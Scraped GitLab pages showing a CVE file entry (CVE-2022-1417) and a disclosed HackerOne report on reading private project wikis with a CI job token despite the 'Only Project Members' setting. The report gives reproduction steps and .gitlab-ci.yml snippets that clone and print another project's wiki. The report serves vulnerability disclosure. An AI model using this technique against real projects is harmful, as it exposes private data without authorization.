=== Content from gitlab.com_e47b531a_20250115_102456.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2022](/gitlab-org/cves/-/tree/master/2022)
* [**CVE-2022-1417.json**](/gitlab-org/cves/-/blob/master/2022/CVE-2022-1417.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2022/CVE-2022-1417.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2022/CVE-2022-1417.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ GitLab Bot 's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 " GitLab Bot ")](/gitlab-bot)

  May 11, 2022

  [702e469a](/gitlab-org/cves/-/commit/702e469a677e680a485a8a3983a5d021e02b3af8)
  [Publishing 2 updated advisories and 0 new advisories](/gitlab-org/cves/-/commit/702e469a677e680a485a8a3983a5d021e02b3af8)
  繚
  702e469a

  [ GitLab Bot ](/gitlab-bot) authored May 11, 2022

  702e469a

  [Publishing 2 updated advisories and 0 new advisories](/gitlab-org/cves/-/commit/702e469a677e680a485a8a3983a5d021e02b3af8)
  [ GitLab Bot ](/gitlab-bot) authored May 11, 2022

Loading



=== Content from gitlab.com_688cc082_20250115_102456.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Backend: Able to git the wiki despite of the Only Project Members setting

**[HackerOne report #1075586](https://hackerone.com/reports/1075586)** by `shells3c` on 2021-01-10, assigned to [@rchan-gitlab](/rchan-gitlab "Ron Chan"):

[Report](#report) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

There was a problem by mistake while confirming the patch for the Wiki bug in the past report: #887755, and the fact that the bug is still there! I am able to git private wiki using the `CI_JOB_TOKEN` (public project)

##### Steps to reproduce

1. Create a project, set the **Wiki visibility** to **Only Project Members** in the setting page: `https://gitlab.com/&lt;user&gt;/&lt;project&gt;/edit`
2. Login as another user (attacker), create **.gitlab-ci.yml** in an arbitrary project:

```
stages:
  - steal
test:
  stage: steal
  script:
    - &#39;git clone http://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/company/api.wiki.git&#39;
    - &#39;cd api.wiki &amp;&amp; cat api-doc.md&#39;
```

3. In the pipeline output, you will able to read the content

##### Examples

* Can't access this: <https://gitlab.com/just4hack2/mypro/-/wikis/home>
* Try adding the following in your **.gitlab-ci.yml** and read the wiki:

```
stages:
  - steal
test:
  stage: steal
  script:
    - &#39;git clone http://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/just4hack2/mypro.wiki.git&#39;
    - &#39;cd api.wiki&#39;
    - &#39;ls&#39;
    - &#39;cat home.md&#39;
```

#### Impact

Able to read the private Wiki of Gitlab projects

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Edited Apr 14, 2022 by [Mark Nuzzo](/marknuzzo)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


